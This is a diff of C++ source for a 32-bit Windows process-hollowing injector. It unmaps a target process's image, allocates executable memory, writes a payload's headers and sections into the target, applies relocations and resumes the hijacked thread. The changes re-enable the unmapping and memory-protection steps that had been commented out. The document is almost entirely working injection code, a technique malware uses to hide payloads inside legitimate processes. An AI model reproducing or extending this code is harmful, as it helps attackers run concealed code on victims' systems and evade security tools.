@@ -10,17 +10,11 @@
 Hollowing32Bit::Hollowing32Bit(const std::string& targetPath, const std::string& payloadPath) :
     HollowingFunctions(targetPath, payloadPath)
 {
-    if ((_isPayload64Bit || _isTarget64Bit) && !IsWindows64Bit())
-        {
-            std::cout << "Cannot work with 64 bit images on a 32 bit Windows build!" << std::endl;
-            throw ""; // Replace with an exception class
-        }
-
-        if (!AreProcessesCompatible())
-        {   
-            std::cout << "The processes are not compatible!" << std::endl;
-            throw ""; // Replace with an exception class
-        }
+    if (!AreProcessesCompatible())
+    {
+        std::cout << "The processes are incompatible!" << std::endl;
+        throw ""; // Replace with an exception class
+    }
 }
 
 void Hollowing32Bit::hollow()
@@ -34,12 +28,12 @@ void Hollowing32Bit::hollow()
 
     std::cout << "SectionAlignment: " << std::hex << payloadNTHeaders.OptionalHeader.SectionAlignment << std::endl;
 
-    /* if (0 != NtdllFunctions::_NtUnmapViewOfSection(_targetProcessInformation.hProcess, (PVOID)targetPEB.ImageBaseAddress))
+    if (0 != NtdllFunctions::_NtUnmapViewOfSection(_targetProcessInformation.hProcess, (PVOID)targetPEB.ImageBaseAddress))
     {
         std::cout << "206" << std::endl;
         // Exception
-    } */
-    PVOID targetNewBaseAddress = VirtualAllocEx(_targetProcessInformation.hProcess, nullptr,
+    }
+    PVOID targetNewBaseAddress = VirtualAllocEx(_targetProcessInformation.hProcess, (PVOID)targetPEB.ImageBaseAddress,
         payloadNTHeaders.OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (nullptr == targetNewBaseAddress)
     {
@@ -65,16 +59,12 @@ void Hollowing32Bit::hollow()
     std::cout << "Resuming the target's main thread" << std::endl;
     
     NtdllFunctions::_NtResumeThread(_targetProcessInformation.hThread, nullptr);
-
-    delete[] _payloadBuffer;
 }
 
 void Hollowing32Bit::WriteTargetProcessHeaders(PVOID targetBaseAddress, PBYTE sourceFileContents)
 {
     IMAGE_DOS_HEADER sourceDOSHeader = *((PIMAGE_DOS_HEADER)sourceFileContents);
     IMAGE_NT_HEADERS32 sourceNTHeaders = *((PIMAGE_NT_HEADERS32)(sourceFileContents + sourceDOSHeader.e_lfanew));
-
-    // std::cout << "Delta: " << (intptr_t)targetBaseAddress - sourceNTHeaders.OptionalHeader.ImageBase << std::endl;
 
     sourceNTHeaders.OptionalHeader.ImageBase = (intptr_t)targetBaseAddress;
 
@@ -84,7 +74,7 @@ void Hollowing32Bit::WriteTargetProcessHeaders(PVOID targetBaseAddress, PBYTE so
     DWORD oldProtection = 0;
     SIZE_T writtenBytes = 0;
     if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, targetBaseAddress, sourceFileContents,
-        sourceNTHeaders.OptionalHeader.SizeOfHeaders, &writtenBytes))
+        sourceNTHeaders.OptionalHeader.SizeOfHeaders, &writtenBytes) || writtenBytes != sourceNTHeaders.OptionalHeader.SizeOfHeaders)
     {
         std::cout << "213" << std::endl;
     }
@@ -92,8 +82,8 @@ void Hollowing32Bit::WriteTargetProcessHeaders(PVOID targetBaseAddress, PBYTE so
     {
         std::cout << "130" << std::endl;
     }
-    //VirtualProtectEx(_targetProcessInformation.hProcess, targetBaseAddress, sourceNTHeaders.OptionalHeader.SizeOfHeaders,
-        //PAGE_READONLY, &oldProtection);
+    VirtualProtectEx(_targetProcessInformation.hProcess, targetBaseAddress, sourceNTHeaders.OptionalHeader.SizeOfHeaders,
+        PAGE_READONLY, &oldProtection);
 
     for (int i = 0; i < sourceNTHeaders.FileHeader.NumberOfSections; i++)
     {
@@ -105,8 +95,8 @@ void Hollowing32Bit::WriteTargetProcessHeaders(PVOID targetBaseAddress, PBYTE so
             currentSection->VirtualAddress), (PVOID)(sourceFileContents + currentSection->PointerToRawData),
             currentSection->SizeOfRawData, nullptr);
 
-        //VirtualProtectEx(_targetProcessInformation.hProcess, targetBaseAddress, sourceNTHeaders.OptionalHeader.SizeOfHeaders,
-            //SectionCharacteristicsToMemoryProtections(currentSection->Characteristics), &oldProtection);
+        VirtualProtectEx(_targetProcessInformation.hProcess, targetBaseAddress, sourceNTHeaders.OptionalHeader.SizeOfHeaders,
+            SectionCharacteristicsToMemoryProtections(currentSection->Characteristics), &oldProtection);
     }
 }
 
@@ -184,9 +174,7 @@ void Hollowing32Bit::RelocateTargetProcess(ULONGLONG baseAddressesDelta, PVOID p
     while (dwOffset < relocData->Size)
     {
         PBASE_RELOCATION_BLOCK pBlockHeader = (PBASE_RELOCATION_BLOCK)&_payloadBuffer[dwRelocAddr + dwOffset];
-
         DWORD dwEntryCount = CountRelocationEntries(pBlockHeader->BlockSize);
-
         PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&_payloadBuffer[dwRelocAddr + dwOffset + sizeof(BASE_RELOCATION_BLOCK)];
 
         ProcessTargetRelocationBlock(pBlockHeader, pBlocks, processBaseAddress, baseAddressesDelta);
@@ -227,20 +215,6 @@ void Hollowing32Bit::ProcessTargetRelocationBlock(PBASE_RELOCATION_BLOCK baseRel
 
 void Hollowing32Bit::UpdateBaseAddressInTargetPEB(PVOID processNewBaseAddress)
 {
-    /* PROCESS_BASIC_INFORMATION targetBasicInformation;
-    DWORD returnLength = 0;
-
-    NtdllFunctions::_NtQueryInformationProcess(_targetProcessInformation.hProcess, ProcessBasicInformation,
-        &targetBasicInformation, sizeof(targetBasicInformation), &returnLength);
-
-    LPVOID pebImageBaseFieldAddress = (LPVOID)((LPBYTE)(targetBasicInformation.PebBaseAddress + 0x1000) + offsetof(PEB32, ImageBaseAddress));
-
-    SIZE_T written = 0;
-    if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, pebImageBaseFieldAddress, &processNewBaseAddress, sizeof(DWORD), &written))
-    {
-        std::cout << "221" << std::endl;
-    } */
-
     WOW64_CONTEXT threadContext;
     threadContext.ContextFlags = WOW64_CONTEXT_ALL;
 
